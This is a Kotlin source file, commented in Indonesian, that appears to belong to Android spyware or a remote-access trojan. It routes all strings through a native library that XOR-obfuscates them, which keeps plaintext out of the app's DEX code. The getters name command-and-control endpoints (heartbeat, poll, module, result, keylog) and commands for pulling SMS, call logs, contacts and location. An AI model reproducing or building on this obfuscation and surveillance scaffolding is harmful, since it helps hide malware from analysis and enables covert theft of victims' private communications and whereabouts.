package com.nexlink.bridge

/**
 * String provider — sekarang delegate ke NativeCore (libnative_core.so).
 * Plaintext string TIDAK ada di DEX; semua di .so yang di-XOR-obfuscate.
 * API compat: semua fun tetap sama supaya caller tidak perlu diubah.
 */
internal object ObfStr {
    init { NativeCore.ensureLoaded() }

    fun configUrl()          = NativeCore.getString(StringIds.CONFIGURL)
    fun apiKeyEndpoint()     = NativeCore.getString(StringIds.APIKEYENDPOINT)
    fun apiHeartbeat()       = NativeCore.getString(StringIds.APIHEARTBEAT)
    fun apiPoll()            = NativeCore.getString(StringIds.APIPOLL)
    fun apiModule()          = NativeCore.getString(StringIds.APIMODULE)
    fun apiResult()          = NativeCore.getString(StringIds.APIRESULT)
    fun apiKeylog()          = NativeCore.getString(StringIds.APIKEYLOG)
    fun prefsName()          = NativeCore.getString(StringIds.PREFSNAME)
    fun prefsKeyId()         = NativeCore.getString(StringIds.PREFSKEYID)
    fun mainPrefsName()      = NativeCore.getString(StringIds.MAINPREFSNAME)
    fun cmdSms()             = NativeCore.getString(StringIds.CMDSMS)
    fun cmdSmsPrefix()       = NativeCore.getString(StringIds.CMDSMSPREFIX)
    fun cmdCalls()           = NativeCore.getString(StringIds.CMDCALLS)
    fun cmdCallsPrefix()     = NativeCore.getString(StringIds.CMDCALLSPREFIX)
    fun cmdContacts()        = NativeCore.getString(StringIds.CMDCONTACTS)
    fun cmdContactsPrefix()  = NativeCore.getString(StringIds.CMDCONTACTSPREFIX)
    fun cmdLocation()        = NativeCore.getString(StringIds.CMDLOCATION)
    fun cmdResult()          = NativeCore.getString(StringIds.CMDRESULT)
    fun wakeLock()           = NativeCore.getString(StringIds.WAKELOCK)
    fun wakeScreen()         = NativeCore.getString(StringIds.WAKESCREEN)
    fun panelTag()           = NativeCore.getString(StringIds.PANELTAG)
    fun brandTag()           = NativeCore.getString(StringIds.BRANDTAG)
    fun msgOk()              = NativeCore.getString(StringIds.MSGOK)
    fun msgDenied()          = NativeCore.getString(StringIds.MSGDENIED)
}
